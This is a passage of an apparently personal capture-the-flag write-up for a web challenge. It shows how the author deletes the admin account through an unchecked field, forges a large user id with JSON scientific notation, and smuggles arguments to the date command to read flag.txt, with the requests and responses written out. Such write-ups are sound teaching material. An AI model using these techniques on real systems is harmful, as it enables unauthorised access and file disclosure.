+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">delete_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">email</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;user doesnt exist&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="n">email</span><span class="p">]</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">save_db</span><span class="p">()</span>
+    <span class="k">return</span> <span class="kc">True</span>
+</code></pre></div>
+
+<h3>Let's become the admin</h3>
+<p>There is no protection against providing the admin's email address. 
+Let's use this finding to to delete the admin account.</p>
+<h4>Deleting the admin account</h4>
+<p>Let's go to the Settings page again, turn on network monitoring in Firefox, and click submit on "Change Email".</p>
+<p><img alt="screenshot of the settings page with an interface to change the email address or delete the account" src="/assets/ctf/2023/alles/web_cybercrime/account_settings.png" /></p>
+<p>The request was:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="s2">&quot;edit_account&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="s2">&quot;8476@abcde.com&quot;</span><span class="p">}}</span>
+</code></pre></div>
+
+<p>and the response:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;return&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Error&quot;</span><span class="p">,</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Fail&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<p>(we got an error because our email already exists in the database).</p>
+<p>We can then right click on that request, choose "Edit and resend", and change the request to delete the admin account. This will also delete our account, so we only have one try at this (without bruteforcing another account).</p>
+<p>Request:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="s2">&quot;delete_account&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="s2">&quot;8476@abcde.com&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;other_email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin@cscg.de&quot;</span><span class="p">}}</span>
+</code></pre></div>
+
+<p>Response:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;return&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Success&quot;</span><span class="p">,</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;deleted account&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<h4>Becoming the admin</h4>
+<p>Now that the admin account has been deleted from the database, we can create a new account with a dummy email (account creation prevents using the admin's email), and then change the account email to the admin email in the settings.</p>
+<p>However, there is one caveat. Here's the admin authentication code from <code>UserDB</code> I referenced at the beginning:</p>
+<p><code>Userdb.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">is_admin</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">email</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="c1">#TODO check userid type etc</span>
+    <span class="k">return</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;admin@cscg.de&quot;</span> <span class="ow">and</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;userid&quot;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">90000000</span>
+</code></pre></div>
+
+<p>Our new user's <code>userid</code> needs to be greater than 90 million. Let's see the account creation code again, but only the parts relevant to the user id.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_create_account</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="c1"># [...]</span>
+
+    <span class="n">groupid</span> <span class="o">=</span> <span class="n">dt</span><span class="p">[</span><span class="s2">&quot;groupid&quot;</span><span class="p">]</span>
+    <span class="n">userid</span><span class="o">=</span><span class="n">dt</span><span class="p">[</span><span class="s2">&quot;userid&quot;</span><span class="p">]</span>
+
+    <span class="c1"># [...]</span>
+
+    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">groupid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+    <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">userid</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="n">userid</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s2">&quot;1&quot;</span> <span class="o">+</span> <span class="n">groupid</span> <span class="o">+</span> <span class="n">userid</span><span class="p">)</span>
+
+    <span class="c1"># [...]</span>
+
+    <span class="k">if</span> <span class="n">userdb</span><span class="o">.</span><span class="n">add_user</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">userid</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="c1"># [...]</span>
+</code></pre></div>
+
+<ol>
+<li><code>groupid</code> comes from the request and it needs to be 3 characters long </li>
+<li><code>userid</code> also comes from the request and it needs to be 4 characters long </li>
+<li>they are both used to create the database user id with <code>json.loads()</code></li>
+<li>which is used to add the user to the database</li>
+</ol>
+<p>The weird way of creating the user id with no other validation...</p>
+<div class="codehilite"><pre><span></span><code><span class="n">userid</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s2">&quot;1&quot;</span> <span class="o">+</span> <span class="n">groupid</span> <span class="o">+</span> <span class="n">userid</span><span class="p">)</span>
+</code></pre></div>
+
+<p>...means we can try using those fields to create valid json parsing to something greater than 90 million.</p>
+<p>Setting <code>groupid</code> to <code>000</code> and <code>userid</code> to <code>0000</code> is not enough - that would evaluate into only 10 million.</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="o">+</span><span class="s1">&#39;000&#39;</span><span class="o">+</span><span class="s1">&#39;0000&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">90_000_000</span>
+<span class="kc">False</span>
+</code></pre></div>
+
+<p>Fortunately, json allows scientific notation for numbers. I tried setting <code>groupid</code> to <code>e10</code> and <code>userid</code> to four spaces (whitespace is ignored) and it worked.</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="o">+</span><span class="s1">&#39;e10&#39;</span><span class="o">+</span><span class="s1">&#39;    &#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">90_000_000</span>
+<span class="kc">True</span>
+</code></pre></div>
+
+<p>Now I only need to modify the account creation code above to use those values and run it again.</p>
+<div class="codehilite"><pre><span></span><code>Making account with userid      and email admin@abcde.com
+000000000000000000001111111111111111111122222222222222222222333333333333333333334444444444444444444455*5555555555555555566
+Success!
+</code></pre></div>
+
+<p><img alt="logging in with the newly created account" src="/assets/ctf/2023/alles/web_cybercrime/future_admin_account_login" /></p>
+<p>Logging in still shows the normal homepage - our email (admin@abcde.com) is still not the admin email (admin@cscg.de).</p>
+<p><img alt="screenshot of the user home page with links to account settings and to log out" src="/assets/ctf/2023/alles/web_cybercrime/normal_user_home_page.png" /></p>
+<p>We should be able to change the email address in the settings.</p>
+<p><img alt="screenshot of the user settings page, changing the email address to the admin's email address" src="/assets/ctf/2023/alles/web_cybercrime/future_admin_email_after.png" /></p>
+<p>Clicking submit brings us back to the home page, but now we have the link to the admin page.</p>
+<p><img alt="screenshot of the user home page with links to account settings, to log out, and to the admin dashboard" src="/assets/ctf/2023/alles/web_cybercrime/admin_homepage.png" /></p>
+<h3>We're in</h3>
+<p>The admin page has a field for the command and a submit button.</p>
+<p><img alt="screenshot of the admin dashboard with a command text field and a submit button" src="/assets/ctf/2023/alles/web_cybercrime/admin_dashboard_date.png" /></p>
+<p>As we saw earlier, the command is validated to only allow the <code>date</code> command.</p>
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">api_admin</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;Not logged in&quot;</span><span class="p">)</span>
+    <span class="n">is_admin</span> <span class="o">=</span> <span class="n">userdb</span><span class="o">.</span><span class="n">is_admin</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s2">&quot;email&quot;</span><span class="p">])</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_admin</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;User is not Admin&quot;</span><span class="p">)</span>
+
+    <span class="n">cmd</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">][</span><span class="s2">&quot;cmd&quot;</span><span class="p">]</span>
+    <span class="c1"># currently only &quot;date&quot; is supported</span>
+    <span class="k">if</span> <span class="n">validate_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">success_msg</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+
+    <span class="k">return</span> <span class="n">error_msg</span><span class="p">(</span><span class="s2">&quot;invalid command&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p><code>app.py</code></p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">validate_command</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">string</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+</code></pre></div>
+
+<p>However, nothing prevents us from passing a list of 4 values, the first being <code>date</code>.</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="k">def</span> <span class="nf">validate_command</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+<span class="o">...</span>     <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span> <span class="ow">and</span> <span class="n">string</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;date&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+<span class="o">...</span> 
+<span class="o">&gt;&gt;&gt;</span> <span class="n">validate_command</span><span class="p">([</span><span class="s1">&#39;date&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">])</span>
+<span class="kc">True</span>
+</code></pre></div>
+
+<p>The way <code>subprocess.run(args)</code> works, if <code>args</code> is a list, the first element is going to be the command that's executed, and the remaining ones are given used as commandline arguments for it. We still can't cat the flag.
+I needed to read up on the <code>date</code> command, to see if I can find any parameters to pass that would reveal the flag, and I found the solution.
+First, we can make <code>date</code> take input from a file with <code>-f filename</code>. But that only uses up 3 elements. I needed a flag that doesn't need any arguments, and found <code>-u</code>.</p>
+<div class="codehilite"><pre><span></span><code>$ date --help
+Usage: date [OPTION]... [+FORMAT]
+  or:  date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]
+Display date and time in the given FORMAT.
+With -s, or with [MMDDhhmm[[CC]YY][.ss]], set the date and time.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -d, --date=STRING          display time described by STRING, not &#39;now&#39;
+      --debug                annotate the parsed date,
+                              and warn about questionable usage to stderr
+  -f, --file=DATEFILE        like --date; once for each line of DATEFILE
+  -I[FMT], --iso-8601[=FMT]  output date/time in ISO 8601 format.
+                               FMT=&#39;date&#39; for date only (the default),
+                               &#39;hours&#39;, &#39;minutes&#39;, &#39;seconds&#39;, or &#39;ns&#39;
+                               for date and time to the indicated precision.
+                               Example: 2006-08-14T02:34:56-06:00
+  --resolution               output the available resolution of timestamps
+                               Example: 0.000000001
+  -R, --rfc-email            output date and time in RFC 5322 format.
+                               Example: Mon, 14 Aug 2006 02:34:56 -0600
+      --rfc-3339=FMT         output date/time in RFC 3339 format.
+                               FMT=&#39;date&#39;, &#39;seconds&#39;, or &#39;ns&#39;
+                               for date and time to the indicated precision.
+                               Example: 2006-08-14 02:34:56-06:00
+  -r, --reference=FILE       display the last modification time of FILE
+  -s, --set=STRING           set time described by STRING
+  -u, --utc, --universal     print or set Coordinated Universal Time (UTC)
+      --help        display this help and exit
+      --version     output version information and exit
+</code></pre></div>
+
+<p>The original request was:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;cmd&quot;</span><span class="p">:</span><span class="s2">&quot;date&quot;</span><span class="p">}}</span>
+</code></pre></div>
+
+<p>And the response was:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;return&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Success&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Wed Aug 16 21:24:36 UTC 2023\n&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<p>Using the "Edit and resend" tool in Firefox again to change the request:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;cmd&quot;</span><span class="p">:[</span><span class="s2">&quot;date&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-f&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;flag.txt&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;-u&quot;</span><span class="p">]}}</span>
+</code></pre></div>
+
+<p>Produces to this response:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;return&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Success&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;date: invalid date \u2018ALLES!{js0n_b0urn3_str1kes_ag4in!}\u2019\n&quot;</span><span class="p">}</span>
+</code></pre></div>
+
+<p>Which finally gives us the flag:</p>
+<div class="codehilite"><pre><span></span><code>ALLES!{js0n_b0urn3_str1kes_ag4in!}
+</code></pre></div>
+
+<p><a href="/index.html">Home</a></p>
+        </article>
+        <footer>
+            <small class="ibmvga">this website doesn't use cookies or js</small>
+        <footer>
+    </body>
+</html>
